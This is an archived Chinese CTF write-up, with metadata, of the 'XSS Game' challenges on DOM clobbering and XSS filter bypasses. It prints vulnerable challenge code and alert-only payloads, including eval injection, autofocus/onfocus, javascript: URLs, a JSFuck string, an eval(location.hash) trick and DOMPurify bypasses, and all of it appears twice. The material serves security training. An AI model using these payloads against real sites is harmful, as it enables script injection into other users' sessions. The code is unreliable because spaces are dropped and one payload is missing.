---
title: 学习DOM破坏(DOM Clobbering)与XSS绕过技巧大全
contest: XSS Game系列 + prompt(1) to win + 看雪SDC 2025
year: 2025
difficulty: medium
vuln_type: xss
tags:
- DOM_Clobbering
- XSS
- innerHTML
- autofocus
- onfocus
- javascript伪协议
- form_submit
- DOMPurify
- 8680439..toString(30)
- JSFuck
- eval
- location.hash
- Function构造
- XSS_Challenge
attack_chain: spaghet(直接innerHTML无过滤) → maname(eval模板字符串) → wey(autofocus+onfocus) → ricardo(JavaScript伪协议+form.action submit) → will(innerHTML过滤反引号/括号/反斜杠) → balls(JSFuck URL编码) → mafia(eval(location.hash.slice(1))绕过50字符+过滤) → boomer(DOMPurify+tel:伪协议) → Object.getOwnPropertyNames(window).filter(Element$)找自定义toString
key_payload: ?jeff=";alert(1)// + ?wey="autofocus onfocus=alert(1337)" + ?ricardo=javascript:alert(1337) + ?balls=JSFuck + ?mafia=eval(location.hash.slice(1))#alert(1337) + ?boomer=<a id=ok href="tel:alert(1)">
one_liner: 看雪JGwebre总结XSS Game 9关DOM Clobbering与XSS绕过:innerHTML/eval/autofocus/javascript伪协议/JSFuck/Function/DOMPurify全覆盖。
lesson: innerHTML无过滤直接XSS;eval模板字符串可用";alert(1)// 注入;innerHTML+replace过滤可用autofocus+onfocus自动触发;form.action+submit可用javascript:伪协议;replace过滤alert可用Function(/ALERT(1337)/.source.toLowerCase())构造;slice(0,50)+replace过滤可用eval(location.hash.slice(1))跳转;DOMPurify+定时器+可点击元素可绕过。
quality: high
full_path: 学习一下dom破坏.full.md
meta_path: 学习一下dom破坏.meta.md
images_removed: true
images_removed_count: 5
schema_version: v3.0.0-P0
summary: 学习DOM破坏(DOM Clobbering)与XSS绕过技巧大全。看雪JGwebre总结XSS Game 9关DOM Clobbering与XSS绕过:innerHTML/eval/autofocus/javascript伪协议/JSFuck/Function/DOMPurify全覆盖。。经验：innerHTML无过滤直接XSS;eval模板字符串可用";alert(1)// 注入;in...
category: web
subcategory: xss
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 5
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/274632.html
reasoning_chain:
- 'XSS Game 9 关 + prompt(1) to win + 看雪 SDC 2025 DOM Clobbering 总结, spaghet (直接 innerHTML 无过滤) → 触发点: URL ?somebody= 注入'
- '假设: 注入 payload = <img src=x onerror=alert(1)> → 动作: ?somebody=<img src=x onerror=alert(1)> → 观察: 弹窗 XSS'
- 'maname (eval 模板字符串) → 触发点: ?jeff=";alert(1)// → 假设: eval ma=''Ma name${jeff}'' 注入 → 动作: ;alert(1)// 闭合 → 观察: XSS'
- 'wey (innerHTML 过滤 <>) → 假设: autofocus+onfocus 自动触发 → 动作: ?wey="autofocus onfocus=alert(1337)" → 观察: 渲染时自动 focus'
- 'ricardo (form.action submit) → 假设: javascript: 伪协议 → 动作: ?ricardo=javascript:alert(1337) → 观察: submit() 触发 javascript:'
- 'mafia (eval(location.hash.slice(1)) 绕过 50 字符+过滤) → 假设: hash 不在 URL 长度限制 → 动作: ?mafia=eval(location.hash.slice(1))#alert(1337) → 观察: 弹窗'
- 'boomer (DOMPurify+tel:伪协议) → 假设: DOMPurify 过滤但放过 <a id=ok href=tel:alert(1)> → 动作: 点击 → 观察: 触发 alert(1)'
failed_attempts:
- '试图用 <script> 直接 XSS → 失败: innerHTML 不执行 script'
- '试图用 onclick 绕过 → 失败: 过滤了 onclick'
key_observations:
- innerHTML 无过滤直接 XSS; autofocus+onfocus 自动触发绕过 replace 过滤
- 'form.action+submit 用 javascript: 伪协议; eval(location.hash.slice(1)) 绕过长度限制'
- 'DOMPurify + tel: 伪协议 + 可点击元素可绕过'
- replace 过滤 alert 可用 Function(/ALERT(1337)/.source.toLowerCase()) 构造
- 8680439..toString(30) 是 JSFuck 类变形; data:text/html;base64 是 object 注入标准绕过
prerequisites:
- DOM Clobbering (HTML 命名覆盖 window 属性)
- 'innerHTML 过滤绕过 + javascript: 伪协议'
- JSFuck 编码 + DOMPurify 绕过 (tel:/data:)
---
# 学习一下dom破坏

> 原文: https://www.ctfiot.com/274632.html
> ID: 274632

<!-- Challenge --><h2id="spaghet"></h2><script> spaghet.innerHTML= (newURL(location).searchParams.get('somebody') ||"Somebody") +" Toucha Ma Spaghet!"</script>

<h2id="maname"></h2><script>letjeff = (newURL(location).searchParams.get('jeff') ||"JEFFF")letma =""eval(`ma = "Ma name${jeff}"`)setTimeout(_=>{ maname.innerText= ma },1000)</script>

?jeff=";alert(1)//

<!-- Challenge --><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=``</script>

?wey="autofocus%20onfocus=alert(1337)"

<!-- Challenge --><formid="ricardo"method="GET"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>

?ricardo=javascript:
alert(1337)

<h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>

?markassbrownlee=

/* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)

?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29

mafia = (newURL(location).searchParams.get('mafia') ||'1+1')mafia = mafia.slice(0,50)mafia = mafia.replace(/[`'"+-!\[]]/gi,'_')mafia = mafia.replace(/alert/g,'_')eval(mafia)

eval(8680439..toString(30))(1337)

eval(location.hash.slice(1))

?mafia=eval(location.hash.slice(1))#alert(1337)

Function(/ALERT(1337)/.source.toLowerCase())()

Function(/ALERT(1337)/.source.toLowerCase())()

<h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>

<aid=okhref=javasCript:
alert(1337)>

?boomer=<aid=okhref="tel:
alert(1)">

Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)

看雪ID：JGwebre

https://bbs.kanxue.com/user-home-1004937.htm

*本文为看雪论坛优秀文章，由JGwebre原创，转载请注明来自看雪社区

报名中！看雪·第九届安全开发者峰会（SDC 2025）

# 往期推荐

无”痕”加载驱动模块之傀儡驱动 (上)

为 CobaltStrike 增加 SMTP Beacon

隐蔽通讯常见种类介绍

buuctf-re之CTF分析

物理读写/无附加读写实验

球分享

球点赞

球在看

点击阅读原文查看更多


```
<!-- Challenge --><h2id="spaghet"></h2><script> spaghet.innerHTML= (newURL(location).searchParams.get('somebody') ||"Somebody") +" Toucha Ma Spaghet!"</script>
<h2id="maname"></h2><script>letjeff = (newURL(location).searchParams.get('jeff') ||"JEFFF")letma =""eval(`ma = "Ma name${jeff}"`)setTimeout(_=>{ maname.innerText= ma },1000)</script>
?jeff=";alert(1)//
<!-- Challenge --><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=``</script>
?wey="autofocus%20onfocus=alert(1337)"
<!-- Challenge --><formid="ricardo"method="GET"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
?ricardo=javascript:
alert(1337)
<h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>
?markassbrownlee=
/* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)
?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29
mafia = (newURL(location).searchParams.get('mafia') ||'1+1')mafia = mafia.slice(0,50)mafia = mafia.replace(/[`'"+-!\[]]/gi,'_')mafia = mafia.replace(/alert/g,'_')eval(mafia)
eval(8680439..toString(30))(1337)
eval(location.hash.slice(1))
?mafia=eval(location.hash.slice(1))#alert(1337)
Function(/ALERT(1337)/.source.toLowerCase())()
Function(/ALERT(1337)/.source.toLowerCase())()
<h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>
<aid=okhref=javasCript:
alert(1337)>
?boomer=<aid=okhref="tel:
alert(1)">
Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]